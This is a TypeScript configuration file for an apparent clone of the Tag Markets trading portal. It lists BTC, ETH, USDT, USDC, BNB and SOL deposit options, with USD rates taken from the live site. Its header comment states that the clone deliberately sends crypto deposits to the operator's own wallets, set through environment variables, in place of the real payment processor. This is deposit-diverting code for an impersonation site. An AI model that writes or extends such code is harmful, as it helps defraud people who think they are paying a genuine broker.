/** Deposit wallet configuration for the cloned portal.
 *
 * The real portal hands the crypto deposit off to Uniwire/CryptoChill, which
 * generates an address for Tag Markets. The clone deliberately routes deposits
 * to the account owner's own wallets instead. Set the addresses in `.env.local`
 * (never commit them) — see `.env.example`.
 */

export type DepositCoinId = "BTC" | "ETH" | "USDT" | "USDC" | "BNB" | "SOL";

export type DepositCoin = {
  id: DepositCoinId;
  name: string;
  symbol: string;
  /** Units of coin per 1 USD, taken from the live portal at capture time. */
  rate: number;
  decimals: number;
  networks: string[];
  address: string;
};

const env = (key: string) => process.env[key]?.trim() ?? "";

export function getDepositCoins(): DepositCoin[] {
  return [
    {
      id: "BTC",
      name: "Bitcoin",
      symbol: "BTC",
      rate: 0.00131636,
      decimals: 8,
      networks: [],
      address: env("DEPOSIT_WALLET_BTC"),
    },
    {
      id: "ETH",
      name: "Ethereum",
      symbol: "ETH",
      rate: 0.04466977,
      decimals: 6,
      networks: ["Ethereum"],
      address: env("DEPOSIT_WALLET_ETH"),
    },
    {
      id: "USDT",
      name: "Tether",
      symbol: "USDT",
      rate: 1.00106852,
      decimals: 2,
      networks: ["Ethereum, ERC-20", "Tron, TRC-20", "BSC, BEP-20", "Polygon, ERC-20"],
      address: env("DEPOSIT_WALLET_USDT"),
    },
    {
      id: "USDC",
      name: "USD Coin",
      symbol: "USDC",
      rate: 0.99997246,
      decimals: 2,
      networks: ["Ethereum, ERC-20", "Polygon, ERC-20"],
      address: env("DEPOSIT_WALLET_USDC"),
    },
    {
      id: "BNB",
      name: "Binance Coin",
      symbol: "BNB",
      rate: 0.0014328979,
      decimals: 6,
      networks: ["BSC"],
      address: env("DEPOSIT_WALLET_BNB"),
    },
    {
      id: "SOL",
      name: "Solana",
      symbol: "SOL",
      rate: 0.0111588152,
      decimals: 6,
      networks: [],
      address: env("DEPOSIT_WALLET_SOL"),
    },
  ];
}

export function coinAmount(usd: number, coin: DepositCoin): string {
  return (usd * coin.rate).toFixed(coin.decimals);
}
